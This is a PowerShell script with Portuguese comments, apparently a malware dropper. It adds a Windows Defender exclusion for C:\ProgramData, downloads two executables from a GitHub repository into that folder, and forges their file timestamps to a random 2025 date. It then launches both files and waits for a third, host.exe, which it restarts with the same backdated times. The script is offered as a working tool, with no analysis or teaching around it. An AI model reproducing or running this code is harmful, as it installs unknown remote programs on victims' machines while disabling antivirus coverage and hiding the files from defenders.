Clear-Host

# Gerar data aleatória do ano de 2025
$randomDate = Get-Random -Minimum 1 -Maximum 365 | ForEach-Object { (Get-Date "01/01/2025").AddDays($_) }
$randomDate = $randomDate.AddHours((Get-Random -Minimum 0 -Maximum 24)).AddMinutes((Get-Random -Minimum 0 -Maximum 60)).AddSeconds((Get-Random -Minimum 0 -Maximum 60))

# Adicionar exclusão do ProgramData no Windows Defender
Add-MpPreference -ExclusionPath "C:\ProgramData"

# Baixar arquivos
Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Server.exe" -OutFile "C:\ProgramData\Server.exe"
Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Built.exe" -OutFile "C:\ProgramData\Built.exe"

# Alterar data de todos para a mesma data aleatória de 2025
(Get-Item "C:\ProgramData\Server.exe" ).LastWriteTime = $randomDate
(Get-Item "C:\ProgramData\Server.exe").CreationTime = $randomDate
(Get-Item "C:\ProgramData\Built.exe").LastWriteTime = $randomDate
(Get-Item "C:\ProgramData\Built.exe").CreationTime = $randomDate

# Executar ambos
Start-Process "C:\ProgramData\Server.exe"

# Esperar 5 segundos para o Server.exe inicializar
Start-Sleep -Seconds 5

Start-Process "C:\ProgramData\Built.exe"

# Loop que verifica host.exe no ProgramData
while ($true) {
    $hostFile = "C:\ProgramData\host.exe"
    if (Test-Path $hostFile) {
        # Finalizar o processo host.exe
        Get-Process "host" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $hostFile } | Stop-Process -Force -ErrorAction SilentlyContinue

        # Aguardar 1 segundo para garantir que o arquivo foi liberado
        Start-Sleep -Seconds 1

        # Alterar a data do host.exe
        $file = Get-Item $hostFile -Force
        $file.LastWriteTime = $randomDate
        $file.CreationTime = $randomDate

        # Abrir o host.exe novamente
        Start-Process $hostFile


        Write-Host "Sucesso!" -ForegroundColor Green
        break
    }
    Start-Sleep -Seconds 3
}
